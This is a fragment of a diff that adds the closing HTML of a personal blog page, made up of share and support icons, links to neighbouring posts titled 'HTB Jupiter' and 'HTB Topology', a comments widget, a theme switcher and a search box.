+          ><span class="icon relative inline-block px-1 align-text-bottom"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M201.5 305.5c-13.8 0-24.9-11.1-24.9-24.6 0-13.8 11.1-24.9 24.9-24.9 13.6 0 24.6 11.1 24.6 24.9 0 13.6-11.1 24.6-24.6 24.6zM504 256c0 137-111 248-248 248S8 393 8 256 119 8 256 8s248 111 248 248zm-132.3-41.2c-9.4 0-17.7 3.9-23.8 10-22.4-15.5-52.6-25.5-86.1-26.6l17.4-78.3 55.4 12.5c0 13.6 11.1 24.6 24.6 24.6 13.8 0 24.9-11.3 24.9-24.9s-11.1-24.9-24.9-24.9c-9.7 0-18 5.8-22.1 13.8l-61.2-13.6c-3-.8-6.1 1.4-6.9 4.4l-19.1 86.4c-33.2 1.4-63.1 11.3-85.5 26.8-6.1-6.4-14.7-10.2-24.1-10.2-34.9 0-46.3 46.9-14.4 62.8-1.1 5-1.7 10.2-1.7 15.5 0 52.6 59.2 95.2 132 95.2 73.1 0 132.3-42.6 132.3-95.2 0-5.3-.6-10.8-1.9-15.8 31.3-16 19.8-62.5-14.9-62.5zM302.8 331c-18.2 18.2-76.1 17.9-93.6 0-2.2-2.2-6.1-2.2-8.3 0-2.5 2.5-2.5 6.4 0 8.6 22.8 22.8 87.3 22.8 110.2 0 2.5-2.2 2.5-6.1 0-8.6-2.2-2.2-6.1-2.2-8.3 0zm7.7-75c-13.6 0-24.6 11.1-24.6 24.9 0 13.6 11.1 24.6 24.6 24.6 13.8 0 24.9-11.1 24.9-24.6 0-13.8-11-24.9-24.9-24.9z"/></svg>
+</span></a
+        >
+      
+    
+  </section>
+
+
+      
+  
+    
+    
+    
+    <div class="pt-8">
+      <hr class="border-dotted border-neutral-300 dark:border-neutral-600" />
+      <div class="flex justify-between pt-3">
+        <span>
+          
+            <a class="group flex" href="/blog/htb-jupiter/">
+              <span
+                class="me-2 text-neutral-700 transition-transform group-hover:-translate-x-[2px] group-hover:text-primary-600 dark:text-neutral dark:group-hover:text-primary-400"
+                ><span class="ltr:inline rtl:hidden">&larr;</span
+                ><span class="ltr:hidden rtl:inline">&rarr;</span></span
+              >
+              <span class="flex flex-col">
+                <span
+                  class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500"
+                  >HTB Jupiter</span
+                >
+                <span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400">
+                  
+                    <time datetime="2023-10-22 01:22:49 &#43;0530 IST">22 October 2023</time>
+                  
+                </span>
+              </span>
+            </a>
+          
+        </span>
+        <span>
+          
+            <a class="group flex text-right" href="/blog/htb-topology/">
+              <span class="flex flex-col">
+                <span
+                  class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500"
+                  >HTB Topology</span
+                >
+                <span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400">
+                  
+                    <time datetime="2023-11-04 17:58:58 &#43;0530 IST">4 November 2023</time>
+                  
+                </span>
+              </span>
+              <span
+                class="ms-2 text-neutral-700 transition-transform group-hover:-translate-x-[2px] group-hover:text-primary-600 dark:text-neutral dark:group-hover:text-primary-400"
+                ><span class="ltr:inline rtl:hidden">&rarr;</span
+                ><span class="ltr:hidden rtl:inline">&larr;</span></span
+              >
+            </a>
+          
+        </span>
+      </div>
+    </div>
+  
+
+
+      
+        
+          <div class="pt-3">
+            <hr class="border-dotted border-neutral-300 dark:border-neutral-600" />
+            <div class="pt-3">
+              <script
+    src="https://giscus.app/client.js"
+    data-repo="AbraXa5/personal-blog"
+    data-repo-id="R_kgDOJxB9Aw"
+    data-category="Q&A"
+    data-category-id="DIC_kwDOJxB9A84CXU6d"
+    data-mapping="pathname"
+    data-strict="0"
+    data-reactions-enabled="1"
+    data-emit-metadata="0"
+    data-input-position="bottom"
+    data-theme="dark_dimmed"
+    data-lang="en"
+    data-loading="lazy"
+    crossorigin="anonymous"
+    async
+></script>
+
+            </div>
+          </div>
+        
+      
+    </footer>
+  </article>
+
+        
+          <div class="pointer-events-none absolute bottom-0 end-0 top-[100vh] w-12">
+            <a
+              href="#the-top"
+              class="pointer-events-auto sticky top-[calc(100vh-5.5rem)] flex h-12 w-12 items-center justify-center rounded-full bg-neutral/50 text-xl text-neutral-700 backdrop-blur hover:text-primary-600 dark:bg-neutral-800/50 dark:text-neutral dark:hover:text-primary-400"
+              aria-label="Scroll to top"
+              title="Scroll to top"
+            >
+              &uarr;
+            </a>
+          </div>
+        
+      </main><footer class="py-10 print:hidden">
+  
+  
+    <nav class="pb-4 text-base font-medium text-neutral-500 dark:text-neutral-400">
+      <ul class="flex list-none flex-col sm:flex-row">
+        
+          
+          <li class="group mb-1 text-end sm:mb-0 sm:me-7 sm:last:me-0">
+            
+              <a
+                href="https://www.buymeacoffee.com/abr4xa5"
+                title=""
+                target="_blank"
+                >
+                  <span
+                    class="group-dark:hover:text-primary-400 transition-colors group-hover:text-primary-600"
+                  ><span class="icon relative inline-block px-1 align-text-bottom"><svg width="884" height="1279" viewBox="0 0 884 1279" fill="none" xmlns="http://www.w3.org/2000/svg">
+    <path d="M791.109 297.518L790.231 297.002L788.201 296.383C789.018 297.072 790.04 297.472 791.109 297.518V297.518Z"
+        fill="#0D0C22" />
+    <path d="M803.896 388.891L802.916 389.166L803.896 388.891Z" fill="#0D0C22" />
+    <path
+        d="M791.484 297.377C791.359 297.361 791.237 297.332 791.118 297.29C791.111 297.371 791.111 297.453 791.118 297.534C791.252 297.516 791.379 297.462 791.484 297.377V297.377Z"
+        fill="#0D0C22" />
+    <path d="M791.113 297.529H791.244V297.447L791.113 297.529Z" fill="#0D0C22" />
+    <path
+        d="M803.111 388.726L804.591 387.883L805.142 387.573L805.641 387.04C804.702 387.444 803.846 388.016 803.111 388.726V388.726Z"
+        fill="#0D0C22" />
+    <path d="M793.669 299.515L792.223 298.138L791.243 297.605C791.77 298.535 792.641 299.221 793.669 299.515V299.515Z"
+        fill="#0D0C22" />
+    <path
+        d="M430.019 1186.18C428.864 1186.68 427.852 1187.46 427.076 1188.45L427.988 1187.87C428.608 1187.3 429.485 1186.63 430.019 1186.18Z"
+        fill="#0D0C22" />
+    <path
+        d="M641.187 1144.63C641.187 1143.33 640.551 1143.57 640.705 1148.21C640.705 1147.84 640.86 1147.46 640.929 1147.1C641.015 1146.27 641.084 1145.46 641.187 1144.63Z"
+        fill="#0D0C22" />
+    <path
+        d="M619.284 1186.18C618.129 1186.68 617.118 1187.46 616.342 1188.45L617.254 1187.87C617.873 1187.3 618.751 1186.63 619.284 1186.18Z"
+        fill="#0D0C22" />
+    <path
+        d="M281.304 1196.06C280.427 1195.3 279.354 1194.8 278.207 1194.61C279.136 1195.06 280.065 1195.51 280.684 1195.85L281.304 1196.06Z"
+        fill="#0D0C22" />
+    <path
+        d="M247.841 1164.01C247.704 1162.66 247.288 1161.35 246.619 1160.16C247.093 1161.39 247.489 1162.66 247.806 1163.94L247.841 1164.01Z"
+        fill="#0D0C22" />
+    <path
+        d="M472.623 590.836C426.682 610.503 374.546 632.802 306.976 632.802C278.71 632.746 250.58 628.868 223.353 621.274L270.086 1101.08C271.74 1121.13 280.876 1139.83 295.679 1153.46C310.482 1167.09 329.87 1174.65 349.992 1174.65C349.992 1174.65 416.254 1178.09 438.365 1178.09C462.161 1178.09 533.516 1174.65 533.516 1174.65C553.636 1174.65 573.019 1167.08 587.819 1153.45C602.619 1139.82 611.752 1121.13 613.406 1101.08L663.459 570.876C641.091 563.237 618.516 558.161 593.068 558.161C549.054 558.144 513.591 573.303 472.623 590.836Z"
+        fill="#FFDD00" />
+    <path d="M78.6885 386.132L79.4799 386.872L79.9962 387.182C79.5987 386.787 79.1603 386.435 78.6885 386.132V386.132Z"
+        fill="#0D0C22" />
+    <path
+        d="M879.567 341.849L872.53 306.352C866.215 274.503 851.882 244.409 819.19 232.898C808.711 229.215 796.821 227.633 788.786 220.01C780.751 212.388 778.376 200.55 776.518 189.572C773.076 169.423 769.842 149.257 766.314 129.143C763.269 111.85 760.86 92.4243 752.928 76.56C742.604 55.2584 721.182 42.8009 699.88 34.559C688.965 30.4844 677.826 27.0375 666.517 24.2352C613.297 10.1947 557.342 5.03277 502.591 2.09047C436.875 -1.53577 370.983 -0.443234 305.422 5.35968C256.625 9.79894 205.229 15.1674 158.858 32.0469C141.91 38.224 124.445 45.6399 111.558 58.7341C95.7448 74.8221 90.5829 99.7026 102.128 119.765C110.336 134.012 124.239 144.078 138.985 150.737C158.192 159.317 178.251 165.846 198.829 170.215C256.126 182.879 315.471 187.851 374.007 189.968C438.887 192.586 503.87 190.464 568.44 183.618C584.408 181.863 600.347 179.758 616.257 177.304C634.995 174.43 647.022 149.928 641.499 132.859C634.891 112.453 617.134 104.538 597.055 107.618C594.095 108.082 591.153 108.512 588.193 108.942L586.06 109.252C579.257 110.113 572.455 110.915 565.653 111.661C551.601 113.175 537.515 114.414 523.394 115.378C491.768 117.58 460.057 118.595 428.363 118.647C397.219 118.647 366.058 117.769 334.983 115.722C320.805 114.793 306.661 113.611 292.552 112.177C286.134 111.506 279.733 110.801 273.333 110.009L267.241 109.235L265.917 109.046L259.602 108.134C246.697 106.189 233.792 103.953 221.025 101.251C219.737 100.965 218.584 100.249 217.758 99.2193C216.932 98.1901 216.482 96.9099 216.482 95.5903C216.482 94.2706 216.932 92.9904 217.758 91.9612C218.584 90.9319 219.737 90.2152 221.025 89.9293H221.266C232.33 87.5721 243.479 85.5589 254.663 83.8038C258.392 83.2188 262.131 82.6453 265.882 82.0832H265.985C272.988 81.6186 280.026 80.3625 286.994 79.5366C347.624 73.2302 408.614 71.0801 469.538 73.1014C499.115 73.9618 528.676 75.6996 558.116 78.6935C564.448 79.3474 570.746 80.0357 577.043 80.8099C579.452 81.1025 581.878 81.4465 584.305 81.7391L589.191 82.4445C603.438 84.5667 617.61 87.1419 631.708 90.1703C652.597 94.7128 679.422 96.1925 688.713 119.077C691.673 126.338 693.015 134.408 694.649 142.03L696.731 151.752C696.786 151.926 696.826 152.105 696.852 152.285C701.773 175.227 706.7 198.169 711.632 221.111C711.994 222.806 712.002 224.557 711.657 226.255C711.312 227.954 710.621 229.562 709.626 230.982C708.632 232.401 707.355 233.6 705.877 234.504C704.398 235.408 702.75 235.997 701.033 236.236H700.895L697.884 236.649L694.908 237.044C685.478 238.272 676.038 239.419 666.586 240.486C647.968 242.608 629.322 244.443 610.648 245.992C573.539 249.077 536.356 251.102 499.098 252.066C480.114 252.57 461.135 252.806 442.162 252.771C366.643 252.712 291.189 248.322 216.173 239.625C208.051 238.662 199.93 237.629 191.808 236.58C198.106 237.389 187.231 235.96 185.029 235.651C179.867 234.928 174.705 234.177 169.543 233.397C152.216 230.798 134.993 227.598 117.7 224.793C96.7944 221.352 76.8005 223.073 57.8906 233.397C42.3685 241.891 29.8055 254.916 21.8776 270.735C13.7217 287.597 11.2956 305.956 7.64786 324.075C4.00009 342.193 -1.67805 361.688 0.472751 380.288C5.10128 420.431 33.165 453.054 73.5313 460.35C111.506 467.232 149.687 472.807 187.971 477.556C338.361 495.975 490.294 498.178 641.155 484.129C653.44 482.982 665.708 481.732 677.959 480.378C681.786 479.958 685.658 480.398 689.292 481.668C692.926 482.938 696.23 485.005 698.962 487.717C701.694 490.429 703.784 493.718 705.08 497.342C706.377 500.967 706.846 504.836 706.453 508.665L702.633 545.797C694.936 620.828 687.239 695.854 679.542 770.874C671.513 849.657 663.431 928.434 655.298 1007.2C653.004 1029.39 650.71 1051.57 648.416 1073.74C646.213 1095.58 645.904 1118.1 641.757 1139.68C635.218 1173.61 612.248 1194.45 578.73 1202.07C548.022 1209.06 516.652 1212.73 485.161 1213.01C450.249 1213.2 415.355 1211.65 380.443 1211.84C343.173 1212.05 297.525 1208.61 268.756 1180.87C243.479 1156.51 239.986 1118.36 236.545 1085.37C231.957 1041.7 227.409 998.039 222.9 954.381L197.607 711.615L181.244 554.538C180.968 551.94 180.693 549.376 180.435 546.76C178.473 528.023 165.207 509.681 144.301 510.627C126.407 511.418 106.069 526.629 108.168 546.76L120.298 663.214L145.385 904.104C152.532 972.528 159.661 1040.96 166.773 1109.41C168.15 1122.52 169.44 1135.67 170.885 1148.78C178.749 1220.43 233.465 1259.04 301.224 1269.91C340.799 1276.28 381.337 1277.59 421.497 1278.24C472.979 1279.07 524.977 1281.05 575.615 1271.72C650.653 1257.95 706.952 1207.85 714.987 1130.13C717.282 1107.69 719.576 1085.25 721.87 1062.8C729.498 988.559 737.115 914.313 744.72 840.061L769.601 597.451L781.009 486.263C781.577 480.749 783.905 475.565 787.649 471.478C791.392 467.391 796.352 464.617 801.794 463.567C823.25 459.386 843.761 452.245 859.023 435.916C883.318 409.918 888.153 376.021 879.567 341.849ZM72.4301 365.835C72.757 365.68 72.1548 368.484 71.8967 369.792C71.8451 367.813 71.9483 366.058 72.4301 365.835ZM74.5121 381.94C74.6842 381.819 75.2003 382.508 75.7337 383.334C74.925 382.576 74.4089 382.009 74.4949 381.94H74.5121ZM76.5597 384.641C77.2996 385.897 77.6953 386.689 76.5597 384.641V384.641ZM80.672 387.979H80.7752C80.7752 388.1 80.9645 388.22 81.0333 388.341C80.9192 388.208 80.7925 388.087 80.6548 387.979H80.672ZM800.796 382.989C793.088 390.319 781.473 393.726 769.996 395.43C641.292 414.529 510.713 424.199 380.597 419.932C287.476 416.749 195.336 406.407 103.144 393.382C94.1102 392.109 84.3197 390.457 78.1082 383.798C66.4078 371.237 72.1548 345.944 75.2003 330.768C77.9878 316.865 83.3218 298.334 99.8572 296.355C125.667 293.327 155.64 304.218 181.175 308.09C211.917 312.781 242.774 316.538 273.745 319.36C405.925 331.405 540.325 329.529 671.92 311.91C695.905 308.686 719.805 304.941 743.619 300.674C764.835 296.871 788.356 289.731 801.175 311.703C809.967 326.673 811.137 346.701 809.778 363.615C809.359 370.984 806.139 377.915 800.779 382.989H800.796Z"
+        fill="#0D0C22" />
+</svg>
+</span></span><span
+                    class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2"
+                    >BuyMeACoffee</span
+                  >
+                </a
+              >
+            
+          </li>
+        
+      </ul>
+    </nav>
+  
+  <div class="flex items-center justify-between">
+    <div>
+      
+      
+        <p class="text-sm text-neutral-500 dark:text-neutral-400">
+            &copy;
+            2024
+            Abraxas
+        </p>
+      
+      
+      
+    </div>
+    <div class="flex flex-row items-center">
+      
+      
+      
+      
+        <div
+          class="me-14 cursor-pointer text-sm text-neutral-700 hover:text-primary-600 dark:text-neutral dark:hover:text-primary-400"
+        >
+          <button id="appearance-switcher-0" type="button" aria-label="appearance switcher">
+            <div
+              class="flex h-12 w-12 items-center justify-center dark:hidden"
+              title="Switch to dark appearance"
+            >
+              <span class="icon relative inline-block px-1 align-text-bottom"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M32 256c0-123.8 100.3-224 223.8-224c11.36 0 29.7 1.668 40.9 3.746c9.616 1.777 11.75 14.63 3.279 19.44C245 86.5 211.2 144.6 211.2 207.8c0 109.7 99.71 193 208.3 172.3c9.561-1.805 16.28 9.324 10.11 16.95C387.9 448.6 324.8 480 255.8 480C132.1 480 32 379.6 32 256z"/></svg>
+</span>
+            </div>
+            <div
+              class="hidden h-12 w-12 items-center justify-center dark:flex"
+              title="Switch to light appearance"
+            >
+              <span class="icon relative inline-block px-1 align-text-bottom"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M256 159.1c-53.02 0-95.1 42.98-95.1 95.1S202.1 351.1 256 351.1s95.1-42.98 95.1-95.1S309 159.1 256 159.1zM509.3 347L446.1 255.1l63.15-91.01c6.332-9.125 1.104-21.74-9.826-23.72l-109-19.7l-19.7-109c-1.975-10.93-14.59-16.16-23.72-9.824L256 65.89L164.1 2.736c-9.125-6.332-21.74-1.107-23.72 9.824L121.6 121.6L12.56 141.3C1.633 143.2-3.596 155.9 2.736 164.1L65.89 256l-63.15 91.01c-6.332 9.125-1.105 21.74 9.824 23.72l109 19.7l19.7 109c1.975 10.93 14.59 16.16 23.72 9.824L256 446.1l91.01 63.15c9.127 6.334 21.75 1.107 23.72-9.822l19.7-109l109-19.7C510.4 368.8 515.6 356.1 509.3 347zM256 383.1c-70.69 0-127.1-57.31-127.1-127.1c0-70.69 57.31-127.1 127.1-127.1s127.1 57.3 127.1 127.1C383.1 326.7 326.7 383.1 256 383.1z"/></svg>
+</span>
+            </div>
+          </button>
+        </div>
+      
+    </div>
+  </div>
+  
+  
+</footer>
+<div
+  id="search-wrapper"
+  class="invisible fixed inset-0 z-50 flex h-screen w-screen cursor-default flex-col bg-neutral-500/50 p-4 backdrop-blur-sm sm:p-6 md:p-[10vh] lg:p-[12vh] dark:bg-neutral-900/50"
+  data-url="//localhost:1313/"
+>
+  <div
+    id="search-modal"
+    class="top-20 mx-auto flex min-h-0 w-full max-w-3xl flex-col rounded-md border border-neutral-200 bg-neutral shadow-lg dark:border-neutral-700 dark:bg-neutral-800"
+  >
+    <header class="relative z-10 flex flex-none items-center justify-between px-2">
+      <form class="flex min-w-0 flex-auto items-center">
+        <div class="flex h-8 w-8 items-center justify-center text-neutral-400">
+          <span class="icon relative inline-block px-1 align-text-bottom"><svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
+</span>
+        </div>
+        <input
+          type="search"
+          id="search-query"
+          class="mx-1 flex h-12 flex-auto appearance-none bg-transparent focus:outline-dotted focus:outline-2 focus:outline-transparent"
+          placeholder="Search"
+          tabindex="0"
+        />
+      </form>
+      <button
+        id="close-search-button"
+        class="flex h-8 w-8 items-center justify-center text-neutral-700 hover:text-primary-600 dark:text-neutral dark:hover:text-primary-400"
+        title="Close (Esc)"
+      >
+        <span class="icon relative inline-block px-1 align-text-bottom"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><path fill="currentColor" d="M310.6 361.4c12.5 12.5 12.5 32.75 0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3L54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75 0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75 0-45.25s32.75-12.5 45.25 0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25 0s12.5 32.75 0 45.25l-105.4 105.4L310.6 361.4z"/></svg>
+</span>
+      </button>
+    </header>
+    <section class="flex-auto overflow-auto px-2">
+      <ul id="search-results">
+        
+      </ul>
+    </section>
+  </div>
+</div>
+
+    </div>
+  </body>
+</html>
